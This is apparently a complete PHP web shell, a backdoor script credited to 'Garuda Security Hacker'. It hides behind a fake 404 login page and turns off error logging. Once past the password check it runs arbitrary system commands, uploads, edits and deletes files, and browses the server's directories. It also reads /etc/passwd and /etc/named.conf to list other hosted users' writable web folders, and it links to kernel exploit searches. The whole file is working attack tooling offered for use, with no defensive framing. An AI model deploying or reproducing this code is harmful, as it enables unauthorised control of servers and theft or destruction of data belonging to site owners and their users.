<?php
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@set_time_limit(0); 
$auth_pass = "37a6259cc0c1dae299a7866489dff0bd";
if( get_magic_quotes_gpc() ) { 

function stripslashes_array($array) { 

return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 

} 

$_POST = stripslashes_array($_POST); 

} 

function printLogin() { 

?> 
<h1>404 - Life Not Fun</h1> <p>The requested Love was not found on this Heart.</p> 
<pre align=center><form method=post>
   ________
   / ______ \
   || _  _ ||
   ||| || |||
   |||_||_|||
       || _  _o|| (o)
            ||| || |||    ^~^ ,
             |||_||_|||   ('Y') )
 Bypass Me! ||______||   /   \/
        __________/_________\__(\|||/)______
<input type=password name=pass><input type=submit value='>>'></form></pre>
<hr> <address>Backdoor GSH at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 

    <?php 

exit; 

} 

if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 

if( empty( $auth_pass ) || 

( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 

$_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 

else

printLogin(); 
$lin = $_SERVER['SCRIPT_NAME'];
?>
<html>
	<head>
<!-- Coded by ./SetupID - Garuda Security Hacker -->
<!-- Big Thanks To My Brother $Groo7,Yukinoshita47,p4kl0nc4t,SpecimentID and all family Garuda Security Hacker & LamonganXploiter -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Have Fun in the dark side">
<meta name="author" content="./SetupID">
		<title>.:: <?php print $_SERVER['HTTP_HOST']; ?>: - GSH ::.</title>
		<style type="text/css">
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
#view tr:hover  {
	background-color: #FFFFFF;
			}
 
input {
	font-family: Courier New, Courier, Fixed;
	font-size: 15px;
	background-color: red;
         text-color: white;
}
 
input:hover  {
	background-color: green;
}
textarea {
	font-family: Courier New, Courier, Fixed;
	font-size: 15px;
	background-color: #FFFFFF;
	color: #000000;
}
 
body  {
	font-family: "Rye", Courier;
	background-color: black;
	color: green;
}
h1{ font-family: "Rye", cursive; }
h2{ font-size: 15px;}
fieldset { background:transparent; text-shadow:0px 0px 1px #757575; color:green; padding:10px; border-radius:5px; -moz-border-radius:5px; -webkit-border-radius:5px; border:1px solid cyan; } 
table, th, td {
border-collapse:collapse;
	font-family: "Rye", Geneva, sans-serif;
	background: transparent;
	font-size: 13px;
            }
.gans {
	border: 1px solid #ffffff;
 }
 th {
	padding: 10px;
 }
 

 
#post .buttons  {
	background-color: transparent;
	font-family: Arial;
	font-size: 15px;
	color: #777;
	border: 0;
}
#lin  {
	font-family: "Rye", cursive;
}
		</style> 
	</head>
 
	<body>
<fieldset><legend><h2 style="color: red;">{SetupID Shell}</h2></legend>
<center><h1><u><a href="<?php print $lin; ?>" style='color: red;'>[ Home Shell ]</font></a></u></h1>
		<p style="color: #fff"><b>Masa DepanMu adalah KEMATIAN</b></p></center>
</form>
<?php
session_start();

if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {

$_SESSION['cwd'] = getcwd();

$_SESSION['history'] = array();

$_SESSION['output'] = '';

}

if (!empty($_REQUEST['command'])) {

if (get_magic_quotes_gpc()) {

$_REQUEST['command'] = stripslashes($_REQUEST['command']);

}

if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)

unset($_SESSION['history'][$i]);

array_unshift($_SESSION['history'], $_REQUEST['command']);

$_SESSION['output'] .= 'SetupID@GSH~: ' . $_REQUEST['command'] . "\n";

if(preg_match('~^[[:blank:]]*cd[[:blank:]]*$~', $_REQUEST['command'])) {

$_SESSION['cwd'] = dirname(__FILE__);

} elseif (preg_match('~^[[:blank:]]*cd[[:blank:]]+([^;]+)$~', $_REQUEST['command'], $regs)) {

if ($regs[1][0] == '/') {

$new_dir = $regs[1];

} else {

$new_dir = $_SESSION['cwd'] . '/' . $regs[1];

}

while (strpos($new_dir, '/./') !== false)

$new_dir = str_replace('/./', '/', $new_dir);

while (strpos($new_dir, '//') !== false)

$new_dir = str_replace('//', '/', $new_dir);

while (preg_match('|/\.\.(?!\.)|', $new_dir))

$new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);

if ($new_dir == '') $new_dir = '/';

if (@chdir($new_dir)) {

$_SESSION['cwd'] = $new_dir;

} else {

$_SESSION['output'] .= "cd: could not change to: $new_dir\n";

}

} else {

chdir($_SESSION['cwd']);

$length = strcspn($_REQUEST['command'], " \t");

$token = substr($_REQUEST['command'], 0, $length);

if (isset($aliases[$token]))

$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);

$p = proc_open($_REQUEST['command'],

array(1 => array('pipe', 'w'),

2 => array('pipe', 'w')),

$io);

while (!feof($io[1])) {

$_SESSION['output'] .= htmlspecialchars(fgets($io[1]),

ENT_COMPAT, 'UTF-8');

}

while (!feof($io[2])) {

$_SESSION['output'] .= htmlspecialchars(fgets($io[2]),

ENT_COMPAT, 'UTF-8');

}

fclose($io[1]);

fclose($io[2]);

proc_close($p);

}

}

if (empty($_SESSION['history'])) {

$js_command_hist = '""';

} else {

$escaped = array_map('addslashes', $_SESSION['history']);

$js_command_hist = '"", "' . implode('", "', $escaped) . '"';

}

header('Content-Type: text/html; charset=UTF-8');

function getperms($f)  {
	$mode=fileperms($f);
 
	$perm='';
	$perm .= ($mode & 00400) ? 'r' : '-';
	$perm .= ($mode & 00200) ? 'w' : '-';
	$perm .= ($mode & 00100) ? 'x' : '-';
	$perm .= ($mode & 00040) ? 'r' : '-';
	$perm .= ($mode & 00020) ? 'w' : '-';
	$perm .= ($mode & 00010) ? 'x' : '-';
	$perm .= ($mode & 00004) ? 'r' : '-';
	$perm .= ($mode & 00002) ? 'w' : '-';
	$perm .= ($mode & 00001) ? 'x' : '-';
 
	return $perm;
}
$release = @php_uname('r');
$kernel = @php_uname('s');
$explink = 'http://exploit-db.com/search/?action=search&filter_description=';
	if(strpos('Linux', $kernel) !== false)
		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
	else
		$explink .= urlencode($kernel . ' ' . substr($release,0,3));
print "<font color=\"lime\"><tr><td>[ OS ] :  ".substr(@php_uname(), 0, 120) ."<a href=".$explink." target=_blank style=color: red;>[exploit-db.com]</a></td></tr><br>";
print "<tr><td>[HOST]:".$_SERVER['SERVER_NAME']."</td></tr><br>";
print "<tr><td>[SERVER] : </td><td>".$_SERVER['SERVER_SOFTWARE']."</td></tr><br>";
if (is_callable("posix_getuid") and is_callable("posix_getgid"))  {
	$uid=posix_getuid();
	$uname=posix_getpwuid($uid);
	$uname=$uname['name'];
 
	$gid=posix_getgid();
	$gname=posix_getgrgid($gid);
	$gname=$gname['name'];
 
	print "<tr><td>[USER] : $uid ($uname)</td></tr><br>";
	print "<tr><td>[GROUP] : $gid ($gname)</td></tr>";
}
 
print "</table><br>";
?>
  <script type="text/javascript" language="JavaScript">

var current_line = 0;

var command_hist = new Array(<?php echo $js_command_hist ?>);

var last = 0;

function key(e) {

if (!e) var e = window.event;

if (e.keyCode == 38 && current_line < command_hist.length-1) {

command_hist[current_line] = document.shell.command.value;

current_line++;

document.shell.command.value = command_hist[current_line];

}

if (e.keyCode == 40 && current_line > 0) {

command_hist[current_line] = document.shell.command.value;

current_line--;

document.shell.command.value = command_hist[current_line];

}

}

function init() {

document.shell.setAttribute("autocomplete", "off");

document.shell.output.scrollTop = document.shell.output.scrollHeight;

document.shell.command.focus();

}

</script>
<body onload="init()">
<form method="post" action="">
	<input type="submit" name="logoutx" value="Kill Session">
	<input type="submit" name="salto" value="Salto Kamar">
</form><br>
<form enctype="multipart/form-data" action="<?php print $_SERVER['REQUEST_URI']; ?>" method="POST">
	<input type="hidden" name="Gass">
<tr><td><b id="lin"><font color="lime">Upload File : </td></tr>
<input type="file" name="gsh_file"> <input type="submit" value=">>>"></td></tr>
</form><br><br>
 <form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="POST">
<b id="lin">Command Execution: <tr><td><input name="command" type="text"
onkeyup="key(event)" size="25" tabindex="1" style="border: 4px double #C0C0C0;">
<input type="submit" name="hasilout" value="exec"></td></tr>&nbsp;&nbsp;<tr><td>
</form><br><br>

 <?php
if($_POST['hasilout']){
?>
<center><textarea name="output" readonly="readonly" cols="40" rows="10" style="color: #FFFFFF; background-color: #000000">

<?php

$lines = substr_count($_SESSION['output'], "\n");

$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));

echo rtrim($padding . $_SESSION['output']);
?></textarea></td></tr>
<form method="post" action="?">
	<input type="submit" value="Back">
</form>
<?php
exit;}
?>
<?php
/*
  Beberapa Fitur Tambahan
*/
//fungsi logout
if($_POST['logoutx']) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	print "<script>window.location='?';</script>"; 
}
//fungsi jumping
if($_POST['salto']) {
	echo "<center><h2>Salto Kamar</h2>";
	$i = 0; echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>"; 
		} else { 
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_idx_jump) {
				$user_jumping_dir = "/home/$user_idx_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++; $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
					}
					echo $jrw; $domain_jump = file_get_contents("/etc/named.conf");
					if($domain_jump == '') {
						echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
							$user_jumping_url = $user_jumping_url['name'];
							if($user_jumping_url == $user_idx_jump) {
								echo " => ( <u>$dj</u> )<br>";
							} } } } } } }
								if($i == 0) {
								 } else {
								 	echo "<br>Total ada ".$i." Kimcil di ".gethostbyname($_SERVER['HTTP_HOST'])."";
								 }
								 echo "</div></pre><form method='post' action='?''><input type='submit' value='Back'></form></center><br><br>";
								 exit;
	}
if (isset($_POST['Gass']))  {
  $jal = $_FILES['gsh_file']['name']; if(@copy($_FILES['gsh_file']['tmp_name'], $jal))  {
		print "Upload success at ".$jal."<br>\n";
		print "~ file name: <b>".$_FILES['gsh_file']['name']."</b><br>".
			"\n~ type: ".$_FILES['gsh_file']['type']."<br>\n".
			"~ size: ".$_FILES['gsh_file']['size']." bytes<br>\n";
	}
 
	else print "$ Error while loading ".$_FILES['userfile']['name']."<br>\n";
}

if (isset($_POST['dofile']))  {
	$ref=$_SERVER['HTTP_REFERER'];
	$fname=htmlentities($_POST['dofile']);
	$content=$_POST['content'];
 
	if (isset($_POST['save']))  {
		if (!($fp=fopen($fname,"w")))
			die ("$ Unable to write to <b>$fname</b><br>\n");
 
		fputs ($fp,$content);
		fclose($fp);
 
		print ("File <b>$fname</b> successfully updated<br><br>\n");
	}

	if (isset($_POST['remove']))  {
		unlink ($fname) or die ("$ Unable to remove <b>$fname</b><br>\n");
		print "<b>$fname</b> successfully removed<br><br>\n";
	}
}
 

if (isset($_POST['fname']))  {
	print "# Warning: editing or removing a file is only possible if you've got the privileges to do that<br><br>";
 
	$fname=htmlentities($_POST['fname']);
	$file=file($fname) or print "$ Unable to open <b>$fname</b><br>\n";
 
	print "<center><form action=\"".$_SERVER['REQUEST_URI']."\" method=\"POST\">\n";
	print "<input type=\"hidden\" name=\"dofile\" value=\"$fname\">\n";
	print "<textarea rows=20 cols=80 name=\"content\">";
 
	for ($i=0; $i<count($file); $i++)
		print htmlentities($file[$i]);
 
	print "</textarea><br><br>\n";
	print "<input type=\"submit\" value=\"Save file\" name=\"save\">\n";
	print "<input type=\"submit\" value=\"Delete file\" name=\"remove\">\n";
	print "</form>\n</center>";
}
 
if (isset($_POST['dirname']))
	$path=htmlspecialchars($_POST['dirname']);
else
	$path=getcwd();
 
$dp=@opendir($path) or die("$ Unable to open <b>$path</b><br>\n");
chdir ($path);
$path=getcwd();
 
print "<div id=\"view\"><hr height=1 width=\"100%\">\n";
print "<font color=\"white\">path : <b>".getcwd()."</b></font><br><br>\n\n";
$dir=array();
 
while ($file=readdir($dp))
	if (strcmp(".",$file))
		array_push($dir,"$path/$file");
 
closedir($dp);
sort($dir);
 
?>
<form name="post" id="post" action="<?php print $_SERVER['REQUEST_URI']; ?>" method="POST">
<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr>
		<th class="gans" id="lin" style="font-size: 20px;"><center>type</center></th>
		<th class="gans" id="lin" style="font-size: 20px;"><center>name</center></th>
		<th class="gans" id="lin" style="font-size: 20px;"><center>Permission</center></th>
		</tr>
<?php
for ($i=0; $i<count($dir); $i++)  {
	print "<tr style='font-family: Arial; font-size: 11px;'>\n";
 
	if (basename($dir[$i])==="..")  {
		$tmp=explode('/',getcwd());
		$new="";
 
		for ($j=0; $j<count($tmp)-1; $j++)
			$new .= $tmp[$j]."/";
			
		print "<td width=\"40px\" class=\"gans\"><img src='http://trinitysanrafael.org/wp-content/uploads/2014/01/icon-up.png' width='20px' height='20px'></td>\n";
		print "<td class=\"gans\"><input type=\"submit\" name=\"dirname\" value=\"$new\" class=\"buttons\"></td>\n";
      print "<td class=\"gans\" ><font color=\"lime\"><center>--{ up }--</center></font></td></tr>\n";
	}
 
#read directory
	if (is_dir($dir[$i]))  {
		if (basename($dir[$i])!='..')  {
			print "<td width=\"40px\" class=\"gans\" style=\"font-size: 9px\"><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='></td>\n";
			print "<td class=\"gans\"><input type=\"submit\" name=\"dirname\" value=\"".$dir[$i].
				"\" class=\"buttons\"></td>\n";
			print "<td class=\"gans\"><center>".getperms($dir[$i])."</center></td>\n";

		}
	}
	#Read File
	else  {
		if (basename($dir[$i])!='..')  {
			print "<td width=\"40px\" class=\"gans\" style=\"font-size: 9px\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='></td>\n";
			print "<td class=\"gans\"><input type=\"submit\" name=\"fname\" value=\"$dir[$i]\" class=\"buttons\"></td>\n";
			print "<td class=\"gans\"><center>".getperms($dir[$i])."</center></td></tr>\n";
		}
	}
	
}
 
print "</table></div>\n";
print "<center>Copyright&copy;".date("Y")." <a href=\"http://blog.garudasecurityhacker.org\" target=\"_blank\" style=\"color: lime;\">- Garuda Security Hacker</a></center>\n";

?>
 
	   </body>
</html>
